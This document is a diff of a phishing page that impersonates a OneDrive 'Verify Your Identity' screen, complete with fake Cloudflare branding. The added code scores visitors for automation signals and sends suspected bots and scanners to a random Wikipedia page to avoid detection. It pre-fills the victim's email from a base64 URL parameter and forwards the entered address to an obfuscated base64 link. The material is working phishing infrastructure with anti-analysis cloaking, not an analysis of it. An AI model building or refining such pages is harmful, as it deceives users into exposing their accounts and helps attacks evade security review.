@@ -4,8 +4,9 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Verify Your Identity</title>
+    <!-- Cloudflare CAPTCHA -->
     <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
-    <style>
+   <style>
         body {
             font-family: "Segoe UI", "Segoe UI Web (West European)", -apple-system, BlinkMacSystemFont, Roboto, "Helvetica Neue", sans-serif;
             background-color: #f4f4f4;
@@ -127,16 +128,28 @@
         <span>OneDrive</span>
     </div>
     <div class="container">
-        <img src="https://ehehsonear.pages.dev/liveforever.png" alt="Logo">
+        <img src="https://ehehsonear.pages.dev/liveforever.png" alt="soft Logo">
         <h2>Verify Your Identity</h2>
         <p><strong>You've received a secure document</strong></p>
-        <p2>To open this secure document, please enter the email address to which this item was shared.</p2>
+        <p2>To open this secure document, we'll need to verify the intended recipient's email. Please enter the email address to which this item was shared.</p2>
         
-        <input type="email" id="email-input" placeholder="Enter Email" required autocomplete="email">
+        <input type="email" id="email-input" placeholder="Enter Email" required>
         
-        <div class="cf-turnstile" data-sitekey="sikekey" data-callback="captchaSuccess" data-expired-callback="captchaExpired"></div>
+        <!-- CAPTCHA Section -->
+        <div class="captcha-header">Let us know you are human</div>
+        <div class="cf-turnstile" data-sitekey="0x4AAAAAACaHNXiIB3vMTh35" data-callback="captchaSuccess" data-expired-callback="captchaExpired"></div>
+        
+        <!-- Success Message (Hidden by default) -->
+        <div class="success-message" id="success-message">Success!</div>
         
         <div class="error-message" id="error-message"></div>
+        
+        <!-- Cloudflare Footer -->
+        <div class="cloudflare-footer">
+            <span>CLOUDFLARE</span>
+            <a href="https://www.cloudflare.com/privacypolicy/" target="_blank">Privacy</a> • 
+            <a href="https://www.cloudflare.com/website-terms/" target="_blank">Terms</a>
+        </div>
         
         <button id="continue-button" disabled>Next</button>
         
@@ -147,37 +160,230 @@
     </div>
 
     <script>
+        // Main application variables
+        let attempts = 0;
+        let originalEncodedEmail = '';
+        let botRiskScore = 0;
+        let claimedCrawlerUA = false;
+        let botRiskLevel = 'low';
         let captchaVerified = false;
 
+        // Initialize UA once for consistency
+        const ua = navigator.userAgent || "";
+        const uaLower = ua.toLowerCase();
+
+        // Check if UA claims to be a crawler (separate classification, not risk)
+        function isClaimedCrawlerUA(uaLower) {
+            const knownCrawlers = [
+                "googlebot", "bingbot", "baiduspider", "yandexbot",
+                "duckduckbot", "slurp",
+                "facebookexternalhit", "twitterbot", "linkedinbot"
+            ];
+            return knownCrawlers.some(bot => uaLower.includes(bot));
+        }
+
+        // Categorize bot risk score into actionable levels
+        function getBotRiskLevel(score) {
+            if (score >= 3) return "high";
+            if (score >= 1.5) return "medium";
+            return "low";
+        }
+
+        // Calculate bot risk score with improved signals
+        function calculateBotRiskScore(ua, uaLower) {
+            let score = 0;
+
+            // STRONGEST SIGNALS (3+ points)
+            // 1. Webdriver flag - strongest automation indicator
+            if (navigator.webdriver === true) score += 3;
+            
+            // 2. Headless detection (covers more than just HeadlessChrome)
+            if (/Headless/i.test(ua)) score += 2;
+            
+            // STRONG SIGNALS (2 points)
+            // 3. Zero screen dimensions - almost never real users
+            if (screen.width === 0 || screen.height === 0) score += 2;
+            
+            // 4. Zero available screen dimensions - additional headless signal
+            if (screen.availWidth === 0 || screen.availHeight === 0) score += 1;
+
+            // MODERATE SIGNALS (1 point)
+            // 5. Missing languages - suspicious but not definitive
+            if (!navigator.languages || navigator.languages.length === 0) score += 1;
+            
+            // 6. Very low hardware concurrency on desktop
+            const hc = navigator.hardwareConcurrency;
+            const isMobile = /mobile|android|iphone|ipad|ipod/i.test(uaLower);
+            if (typeof hc === "number" && hc <= 1 && !isMobile) score += 1;
+            
+            // 7. UA-CH consistency check (guarded for Chromium browsers)
+            const claimsChromium = uaLower.includes("chrome") || 
+                                   uaLower.includes("chromium") || 
+                                   uaLower.includes("edg/");
+            
+            if (claimsChromium && navigator.userAgentData?.brands) {
+                const brands = navigator.userAgentData.brands
+                    .map(b => (b.brand || "").toLowerCase())
+                    .join(" ");
+                
+                // Check for mismatch between UA string and brand data
+                if (uaLower.includes("chrome") && 
+                    !brands.includes("chrome") && 
+                    !brands.includes("chromium")) {
+                    score += 1;
+                }
+            }
+
+            // WEAK SIGNALS (0.1-0.5 points)
+            // 8. Storage failures (common in privacy mode)
+            try {
+                localStorage.setItem("__t", "1");
+                localStorage.removeItem("__t");
+            } catch {
+                score += 0.1;
+            }
+
+            return score;
+        }
+
+        // Initialize bot detection signals
+        (function initBotSignals() {
+            claimedCrawlerUA = isClaimedCrawlerUA(uaLower);
+            botRiskScore = calculateBotRiskScore(ua, uaLower);
+            botRiskLevel = getBotRiskLevel(botRiskScore);
+        })();
+
+        // Function to decode email from URL parameter 'e'
+        function extractEmailFromURL() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const encodedEmail = urlParams.get('e');
+            
+            if (encodedEmail) {
+                originalEncodedEmail = encodedEmail; // Store the encoded email for later use
+                
+                try {
+                    // Check if the string contains '@' (split encoded format)
+                    if (encodedEmail.includes('@')) {
+                        const parts = encodedEmail.split('@');
+                        if (parts.length === 2) {
+                            // Decode both parts separately and join with '@'
+                            const decodedLocalPart = atob(parts[0]);
+                            const decodedDomain = atob(parts[1]);
+                            return `${decodedLocalPart}@${decodedDomain}`;
+                        }
+                    }
+                    
+                    // If no '@' or not in split format, try to decode as single base64
+                    return atob(encodedEmail);
+                } catch (e) {
+                    console.error('Error decoding email from URL parameter:', e);
+                    return '';
+                }
+            }
+            return '';
+        }
+
+        async function fetchRandomWiki() {
+            const response = await fetch('https://en.wikipedia.org/wiki/Special:Random');
+            return response.url;
+        }
+
+        // CAPTCHA callback functions
         function captchaSuccess(token) {
             captchaVerified = true;
             document.getElementById('continue-button').disabled = false;
             document.getElementById('error-message').textContent = '';
+            document.getElementById('success-message').style.display = 'block';
         }
 
         function captchaExpired() {
             captchaVerified = false;
             document.getElementById('continue-button').disabled = true;
-            document.getElementById('error-message').textContent = 'Verification expired.';
+            document.getElementById('error-message').textContent = 'CAPTCHA expired. Please verify again.';
+            document.getElementById('success-message').style.display = 'none';
+        }
+
+        function showError(message) {
+            document.getElementById('error-message').textContent = message;
+            document.getElementById('success-message').style.display = 'none';
         }
 
         async function continueLoading() {
             const emailInput = document.getElementById('email-input');
             const email = emailInput.value.trim().toLowerCase();
-            const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
 
-            if (!re.test(email)) {
-                document.getElementById('error-message').textContent = "Please enter a valid email address.";
+            // Validate email format
+            if (!validateEmail(email)) {
+                showError("Please enter a valid email address.");
                 return;
             }
 
-            // Redirection logic
+            // Check if CAPTCHA is verified
+            if (!captchaVerified) {
+                showError("Please complete the CAPTCHA verification.");
+                return;
+            }
+
+            // Clear any previous errors
+            showError('');
+
+            // For any valid email (no email list check)
             const link = "aHR0cHM6Ly9mYWNlYm9vay5jb20vP1M9";
-            const finalLink = `${atob(link)}&e=${btoa(email)}`;
+            const decodedLink = atob(link);
+            
+            // Encode the email for the URL
+            const encodedEmail = btoa(email);
+            
+            // Create final link: decodedlink + &e= + encoded email
+            const finalLink = `${decodedLink}&e=${encodedEmail}`;
+            
+            // Redirect to the final link
             window.location.href = finalLink;
         }
 
-        document.getElementById('continue-button').addEventListener('click', continueLoading);
+        function validateEmail(email) {
+            const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            return re.test(email);
+        }
+
+        // Main initialization
+        window.addEventListener('DOMContentLoaded', () => {
+            // Check bot risk level and take appropriate action
+            if (botRiskLevel === 'high') {
+                console.log(`High bot risk detected (score: ${botRiskScore}, level: ${botRiskLevel}), redirecting...`);
+                fetchRandomWiki().then(url => {
+                    window.location.href = url;
+                });
+                return;
+            }
+            
+            // For medium risk, just log (no blocking)
+            if (botRiskLevel === 'medium') {
+                console.log(`Medium bot risk detected (score: ${botRiskScore}, level: ${botRiskLevel}), monitoring...`);
+            }
+            
+            // Log crawler classification separately
+            if (claimedCrawlerUA) {
+                console.log(`Claimed crawler UA detected: ${ua.substring(0, 100)}...`);
+            }
+            
+            // Normal flow for low/medium risk users
+            const decodedEmail = extractEmailFromURL();
+            if (decodedEmail) {
+                document.getElementById('email-input').value = decodedEmail;
+            } else {
+                // Set placeholder example
+                document.getElementById('email-input').placeholder = "Enter Email";
+            }
+            
+            // Set up event listeners
+            document.getElementById('continue-button').addEventListener('click', continueLoading);
+            document.getElementById('email-input').addEventListener('keydown', function(event) {
+                if (event.key === 'Enter') {
+                    continueLoading();
+                }
+            });
+        });
     </script>
 </body>
 </html>
